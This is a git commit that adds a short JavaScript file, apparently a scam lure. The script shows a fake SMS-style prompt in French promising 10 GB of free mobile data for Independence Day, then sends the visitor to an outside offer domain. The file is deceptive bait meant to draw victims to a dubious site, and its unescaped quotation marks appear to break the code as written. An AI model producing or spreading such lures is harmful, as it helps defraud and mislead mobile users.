33652df4aee29592a0d004b9e4e88fdcbe5cec42
bigetijazz5 <bigetijazz5@gmail.com>
2024-10-01 07:13:02 -0700

    Create gn-independence.js

---
+++ gn-independence.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('SMS: Félicitations, vous avez été sélectionné pour recevoir l'offre de 10 Go de données gratuites pour le jour de l'indépendance. Veuillez appuyer sur 1 pour continuer maintenant','1');
+if (password != '1') {
+location.href='https://www.moreofferzdetails.xyz/independence-10go';
+}
